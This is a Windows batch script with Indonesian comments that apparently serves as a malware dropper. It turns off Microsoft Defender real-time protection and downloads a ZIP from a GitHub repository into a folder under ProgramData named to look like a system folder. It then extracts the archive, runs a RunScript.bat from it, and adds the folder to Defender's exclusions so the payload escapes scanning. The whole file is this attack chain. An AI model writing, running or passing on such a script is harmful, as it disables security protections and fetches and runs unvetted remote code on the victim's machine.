@echo off
:: Wajib dijalankan sebagai administrator
set "folderPath=C:\ProgramData\AppData"
set "zipName=XMASTERTES.zip"
set "extractFolder=XMASTERTES-main"
set "fullPath=%folderPath%\%extractFolder%"

:: Buat folder AppData jika belum ada
mkdir "%folderPath%" 2>nul

:: Nonaktifkan Real-time Protection
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

:: Unduh ZIP dari GitHub
powershell -nologo -noprofile -executionpolicy bypass -command ^
"Invoke-WebRequest -Uri 'https://codeload.github.com/FooTex16/XMASTERTES/zip/refs/heads/main' -OutFile '%folderPath%\%zipName%'"

:: Ekstrak ZIP ke dalam folder tujuan
powershell -nologo -noprofile -executionpolicy bypass -command ^
"Expand-Archive -Path '%folderPath%\%zipName%' -DestinationPath '%folderPath%' -Force"

:: Buka folder hasil ekstrak
start "" explorer "%fullPath%"

:: Jalankan RunScript.bat jika ada
if exist "%fullPath%\RunScript.bat" (
    start "" "%fullPath%\RunScript.bat"
)

:: Tambahkan folder ke pengecualian Defender (dilakukan terakhir)
powershell -Command "Add-MpPreference -ExclusionPath '%fullPath%'"

exit
